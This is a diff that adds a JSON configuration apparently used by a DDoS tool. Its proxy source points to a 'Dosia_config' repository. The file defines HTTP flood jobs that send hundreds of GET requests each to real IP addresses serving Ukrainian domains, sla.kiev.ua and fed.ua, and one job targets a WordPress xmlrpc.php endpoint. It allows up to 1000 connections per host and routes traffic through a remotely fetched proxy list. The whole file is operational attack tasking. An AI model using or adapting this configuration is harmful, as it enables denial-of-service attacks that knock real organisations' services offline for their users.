@@ -1,0 +1,51 @@
+{
+  "config": {
+    "jobs": [
+      {
+        "type": "HTTP",
+        "count": 400,
+        "method": "GET",
+        "path": "http://91.218.212.236/",
+        "header": {
+          "Host": "sla.kiev.ua"
+        }
+      },
+      {
+        "type": "HTTP",
+        "count": 400,
+        "method": "GET",
+        "path": "http://91.218.212.236/xmlrpc.php",
+        "header": {
+          "Host": "sla.kiev.ua"
+        }
+      },
+      {
+        "type": "HTTP",
+        "count": 300,
+        "method": "GET",
+        "path": "https://93.190.45.242/",
+        "header": {
+          "Host": "fed.ua"
+        }
+      }
+    ],
+    "client": {
+      "read_timeout": 90,
+      "write_timeout": 90,
+      "max_conn_duration": 90,
+      "max_idle_conn_duration": 90,
+      "Max_conn_per_host": 1000,
+      "no_default_user_agent_header": true,
+      "disable_header_names_normalizing": true,
+      "disable_path_normalizing": true
+    },
+    "proxyUrl": "https://raw.githubusercontent.com/kintechi341/Dosia_config/main/proxyList.json",
+    "app": {
+      "reload": false,
+      "reload_by_timeout": 0,
+      "update_config_interval": 20,
+      "update_app": "",
+      "update_app_command": false
+    }
+  }
+}
